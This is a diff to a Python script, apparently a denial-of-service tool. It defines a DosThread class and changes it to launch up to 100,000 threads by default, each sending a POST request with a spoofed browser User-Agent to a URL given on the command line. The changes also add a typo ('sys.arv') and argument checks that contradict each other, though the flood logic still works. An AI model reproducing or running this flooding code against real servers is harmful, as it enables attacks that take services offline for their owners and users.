@@ -1,3 +1,4 @@
+import sys
 import time
 import urllib.request
 import threading
@@ -19,35 +20,37 @@ class DosThread(threading.Thread):
         self.url = url
         super().__init__(*args, **kwargs)
 
+    
     def run(self):
-        print("{} started!".format(self.getName()))
-        req = urllib.request.Request(self.url, data)
-        req.add_header('Accept', '*/*')
-        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
-        req.add_header('Connection', '')
-        req.add_header('Content-type', 'text/xml')
-        
-        for x in range(100):  
-            try:
-                res = urllib.request.urlopen(req)
-            except KeyboardInterrupt:
-                print("Interrupted by user")
-                break
-        time.sleep(.2)
-        print("{} finished!".format(self.getName()))
+        try:
+            sys.stdout.write("\r%s requests has been sent" % threading.current_thread().name)
+            sys.stdout.flush()
+            req = urllib.request.Request(self.url, data)
+            req.add_header('Accept', '*/*')
+            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
+            req.add_header('Connection', '')
+            req.add_header('Content-type', 'text/xml')
+            res = urllib.request.urlopen(req)
+        except (Exception,KeyboardInterrupt):
+            sys.exit(0)
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser()
-    parser.add_argument("-url", help="URL to send request to", required=True)
-    args = parser.parse_args()
+    if(len(sys.argv)!=2):
+        print("Enter a valid URL !!")
+        sys.exit(0)
+        
+    url=str(sys.argv[1])
+    
+    if(len(sys.argv)!=3):
+        times=100000
+    else:
+        times=int(sys.arv[2])
 
-    threads = [DosThread(url=args.url, name="Thread-{}".format(i + 1)) for i in range(10000)]
+    threads = [DosThread(url=url, name="{}".format(i + 1)) for i in range(times)]
     for mythread in threads:
-        mythread.start()
-
-    print("\rStarted 0 threads", end="\r")
-    while any([t.is_alive() for t in threads]):
-        print("\rStarted {}/{} threads".format(len([t for t in threads if not t.is_alive()]), len(threads)), end="\r")
-        time.sleep(.5)
-
-
+        try:
+            mythread.start()
+        except (Exception,KeyboardInterrupt):
+            print("\nTotal: "+str(mythread.name))
+            print("Shutting down...")
+            sys.exit(0)
